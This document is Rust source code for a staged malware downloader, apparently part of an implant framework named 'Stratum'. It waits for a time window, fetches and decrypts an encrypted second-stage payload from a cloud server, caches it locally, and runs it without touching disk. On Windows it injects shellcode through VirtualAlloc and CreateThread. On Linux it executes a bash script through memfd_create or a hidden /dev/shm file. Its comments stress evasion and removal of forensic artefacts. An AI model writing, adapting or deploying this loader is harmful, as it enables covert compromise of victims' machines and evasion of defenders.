//! Staged-enc stub — native downloader.
//!
//! On run:
//!   1. Check time window.
//!   2. Try local hw-encrypted blob (BLOB_PATH) first — ddb-first model.
//!   3. If blob missing: download encrypted stage2 from cloud, decrypt with
//!      STUB_SECRET baked at compile time (PBKDF2-SHA256 + AES-256-GCM).
//!   4. Cache hw-encrypted copy to BLOB_PATH for offline resilience.
//!   5. Windows: execute stage2 shellcode blob in-process via VirtualAlloc+CreateThread
//!               (no file on disk, no LoadLibraryA, no child process).
//!      Linux:   exec stage2 bash script via memfd/shm (no disk touch).
//!   6. Server cancels S2_PATH at first heartbeat (no cloud artefact after first run).
//!
//! Stage2 format per platform:
//!   Windows — raw x64 PIC shellcode blob (stub.bin); no MZ header.
//!             The blob is a self-contained reflective loader that maps the
//!             full agent EXE embedded in its .rodata section.
//!   Linux   — bash script prefixed with "STRATUM:" after decrypt.

use crate::transport;
use crate::crypto_compat;
use crate::hw;
#[cfg(not(windows))]
use crate::s;

const STUB_SECRET:  &str = env!("STRATUM_STUB_SECRET");
const SALT:         &str = env!("STRATUM_SALT");
const WINDOW_START: &str = env!("STRATUM_WINDOW_START");
const WINDOW_END:   &str = env!("STRATUM_WINDOW_END");

#[cfg(not(windows))] const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_LINUX");
#[cfg(windows)]      const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_WIN");
#[cfg(not(windows))] const S2_PATH:   &str = env!("STRATUM_S2_PATH_LINUX");
#[cfg(windows)]      const S2_PATH:   &str = env!("STRATUM_S2_PATH_WIN");

pub fn run() {
    while !crate::in_window(WINDOW_START, WINDOW_END) {
        if cfg!(stratum_debug) { eprintln!("[staged-enc] outside time window, sleeping"); }
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
    if cfg!(stratum_debug) { eprintln!("[staged-enc] time window OK"); }

    let t = transport::new_transport();

    // ddb-first: try local hw-encrypted blob before hitting the cloud
    if let Some(payload) = load_blob() {
        if cfg!(stratum_debug) { eprintln!("[staged-enc] blob OK, exec"); }
        let expanded = hw::expand(BLOB_PATH);
        let p = expanded.to_string_lossy();
        std::env::set_var("_BLOB_PATH",  p.as_ref());
        std::env::set_var("_BLOB_TRIED", p.as_ref());
        exec_payload(payload);
        return;
    }

    if cfg!(stratum_debug) { eprintln!("[staged-enc] blob miss, fetching from cloud"); }
    if let Some(payload) = fetch_cloud(&t) {
        if cfg!(stratum_debug) { eprintln!("[staged-enc] cloud OK, caching and exec"); }
        cache_payload(&payload);
        exec_payload(payload);
        return;
    }

    if cfg!(stratum_debug) { eprintln!("[staged-enc] no agent available"); }
}

// ── payload type ──────────────────────────────────────────────────────────────

enum Payload {
    #[cfg(windows)]
    Shellcode(Vec<u8>),
    #[cfg(not(windows))]
    Script(String),
}

// ── fetch + decrypt ───────────────────────────────────────────────────────────

fn fetch_cloud(t: &transport::SharedTransport) -> Option<Payload> {
    if cfg!(stratum_debug) { eprintln!("[staged-enc] downloading S2: {}", S2_PATH); }
    let s2_raw = t.download(S2_PATH)?;
    let s2_b64 = std::str::from_utf8(&s2_raw).ok()?.trim().to_string();
    if cfg!(stratum_debug) { eprintln!("[staged-enc] S2 ok ({} bytes), decrypting with stub_secret", s2_b64.len()); }
    let payload = decode_from_b64(STUB_SECRET, &s2_b64)?;
    if cfg!(stratum_debug) { eprintln!("[staged-enc] decrypted ok"); }
    Some(payload)
}

fn decode_from_b64(bk: &str, s2_b64: &str) -> Option<Payload> {
    #[cfg(windows)]
    {
        let plain = crypto_compat::stratum_decrypt_bytes(bk, s2_b64)?;
        if plain.len() < 64 {
            if cfg!(stratum_debug) { eprintln!("[staged-enc] shellcode blob too small"); }
            return None;
        }
        return Some(Payload::Shellcode(plain));
    }
    #[cfg(not(windows))]
    {
        // Linux stage2 = bash script; decrypt to String, strip STRATUM: prefix.
        let plain  = crypto_compat::openssl_decrypt(bk, s2_b64)?;
        let prefix = s!("STRATUM:");
        let script = plain.strip_prefix(prefix.as_str())?.to_string();
        return Some(Payload::Script(script));
    }
}

// ── cache ─────────────────────────────────────────────────────────────────────

fn cache_payload(payload: &Payload) {
    let raw: Vec<u8> = match payload {
        #[cfg(windows)]
        Payload::Shellcode(b) => b.clone(),
        #[cfg(not(windows))]
        Payload::Script(s) => format!("{}{}", s!("STRATUM:"), s).into_bytes(),
    };
    hw::write_blob(BLOB_PATH, &raw, SALT);
    let expanded = hw::expand(BLOB_PATH);
    let p = expanded.to_string_lossy();
    std::env::set_var("_BLOB_TRIED", p.as_ref());
    if expanded.exists() {
        std::env::set_var("_BLOB_PATH", p.as_ref());
        if cfg!(stratum_debug) { eprintln!("[staged-enc] blob cached: {}", p); }
    } else if cfg!(stratum_debug) {
        eprintln!("[staged-enc] blob cache FAILED: {}", p);
    }
}

fn load_blob() -> Option<Payload> {
    if cfg!(stratum_debug) { eprintln!("[staged-enc] reading blob: {}", BLOB_PATH); }
    #[cfg(windows)]
    {
        let bytes = hw::read_blob_bytes(BLOB_PATH, SALT)?;
        if bytes.len() < 64 {
            if cfg!(stratum_debug) { eprintln!("[staged-enc] blob: shellcode too small"); }
            return None;
        }
        return Some(Payload::Shellcode(bytes));
    }
    #[cfg(not(windows))]
    {
        let plain  = hw::read_blob(BLOB_PATH, SALT)?;
        let prefix = s!("STRATUM:");
        let script = plain.strip_prefix(prefix.as_str())?.to_string();
        return Some(Payload::Script(script));
    }
}

// ── exec ──────────────────────────────────────────────────────────────────────

fn exec_payload(payload: Payload) {
    match payload {
        #[cfg(windows)]
        Payload::Shellcode(sc_bytes) => exec_windows_shellcode(sc_bytes),
        #[cfg(not(windows))]
        Payload::Script(script) => exec_unix(&script),
    }
}

#[cfg(windows)]
fn exec_windows_shellcode(sc_bytes: Vec<u8>) {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect,
        MEM_COMMIT, MEM_RESERVE,
        PAGE_READWRITE, PAGE_EXECUTE_READ,
    };
    use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

    let len = sc_bytes.len();

    let region = unsafe {
        VirtualAlloc(core::ptr::null(), len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if region.is_null() { return; }

    unsafe { core::ptr::copy_nonoverlapping(sc_bytes.as_ptr(), region as *mut u8, len); }
    drop(sc_bytes);

    let mut old: u32 = 0;
    if unsafe { VirtualProtect(region, len, PAGE_EXECUTE_READ, &mut old) } == 0 { return; }

    type EntryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
    let entry: EntryFn = unsafe { core::mem::transmute(region) };

    let thread = unsafe {
        CreateThread(core::ptr::null(), 0, Some(entry), core::ptr::null_mut(), 0, core::ptr::null_mut())
    };

    if thread != 0 {
        unsafe { WaitForSingleObject(thread, 0xFFFFFFFF); }
    }
}

#[cfg(unix)]
fn exec_unix(script: &str) {
    use std::os::unix::process::CommandExt;
    use rand::RngCore;

    // 1. memfd_create: anonymous in-memory fd — no filesystem path, no disk touch.
    #[cfg(target_os = "linux")]
    {
        use std::io::Write;
        use std::os::unix::io::{FromRawFd, IntoRawFd};
        let name = b"a\0";
        let fd = unsafe {
            libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 0i32) as i32
        };
        if fd >= 0 {
            let mut f = unsafe { std::fs::File::from_raw_fd(fd) };
            if f.write_all(script.as_bytes()).is_ok() {
                // Leak the File so the fd stays open across exec — bash needs
                // /proc/self/fd/N to remain valid until it reads the script.
                let fd_live = f.into_raw_fd();
                let fd_path = format!("/proc/self/fd/{}", fd_live);
                let _ = std::process::Command::new("/bin/bash").arg(&fd_path).exec();
                let _ = std::process::Command::new("/bin/sh").arg(&fd_path).exec();
            }
        }
    }

    // 2. /dev/shm (RAM-backed tmpfs) — no physical disk I/O
    let tmp_dir = if std::path::Path::new("/dev/shm").is_dir() {
        std::path::PathBuf::from("/dev/shm")
    } else {
        std::env::temp_dir()
    };

    let tmp_path = tmp_dir.join(format!(".{:016x}", rand::thread_rng().next_u64()));
    if std::fs::write(&tmp_path, script.as_bytes()).is_ok() {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp_path, std::fs::Permissions::from_mode(0o700));
        let _ = std::process::Command::new("/bin/bash").arg(&tmp_path).exec();
        let _ = std::fs::remove_file(&tmp_path);
    }
    let _ = std::process::Command::new("/bin/sh").arg("-c").arg(script).exec();
}
